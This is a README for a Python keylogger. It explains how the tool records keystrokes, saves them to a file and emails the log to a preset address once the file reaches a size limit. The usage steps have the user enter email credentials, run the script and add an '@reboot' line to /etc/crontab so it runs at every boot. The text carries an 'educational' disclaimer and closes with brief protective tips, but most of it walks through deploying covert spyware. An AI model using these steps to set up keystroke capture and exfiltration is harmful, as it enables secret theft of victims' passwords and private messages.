# Python Keylogger

## Overview
This project demonstrates a Python-based keylogger that captures keystrokes and logs them into a file. Additionally, the logged data is sent to an email address once the file reaches a specified size. The project serves as an educational example to understand keylogging techniques and their role in **cybersecurity**.

⚠️ **Disclaimer:** This project is for educational purposes only. Unauthorized use of this tool for malicious intent is illegal and unethical.

---

## Features
- **Real-Time Keylogging:** Captures keyboard input in real-time.
- **File Logging:** Stores logs locally in a specified file.
- **Email Notification:** Sends the log file to a pre-configured email when a size limit is reached.
- **Error Handling:** Includes mechanisms to handle errors and ensure smooth execution.
- **Cross-Platform Compatibility:** Designed to work on Linux and Windows environments.

---

## Use Case
This project is designed for:
- **Cybersecurity Training:** Demonstrating how keyloggers work and how they can be analyzed.
- **Ethical Hacking:** Testing system defenses against keylogging attacks.
- **Educational Purposes:** Enhancing Python programming and automation skills.

---

## Technologies Used
- **Python 3.x**: Primary programming language.
- **Smtplib**: To send logs via email.
- **Pynput**: To capture keyboard events.

---

## Requirements
- Python 3.x installed.
- Required libraries:
  ```bash
  pip install pynput

---

## How It Works
- **Key Logging**: The program listens to keyboard input and temporarily stores it in a buffer.
- **File Logging**: Once the buffer limit is reached, the input is saved to a local log file.
- **Email Sending**: If the log file exceeds a predefined size, its content is sent to a configured email address.
- **Persistence (Optional)**: The script can be added to /etc/crontab (or equivalent) for automatic execution at system boot.

---

## Usage

**1. Clone the repository:**
```bash
git clone https://github.com/yourusername/python-keylogger.git
cd python-keylogger
```

**2. Install required libraries:**
```bash
pip install pynput
```

**3. Configure the script:**
Open the keylogger.py file and update these variables with your email credentials:
```bash
expediteur = "your_email@gmail.com"
mot_de_passe = "your_password"
destinataire = "recipient_email@gmail.com"
```

**4. Run the script:**
```bash
python3 keylogger.py
```

**5. (Optional) Add to cron for persistence:**
Edit /etc/crontab and add the following line:
```bash
@reboot python3 /path/to/keylogger.py &
```

---
## Security Tips 
To protect yourself from keyloggers:
Use reliable antivirus software and keep it updated.
Monitor active processes and scheduled tasks regularly.
Enable multi-factor authentication (MFA) on your accounts.
Be cautious of suspicious emails or software installations.

---

## License
This project is licensed under the MIT License. See the LICENSE file for details.

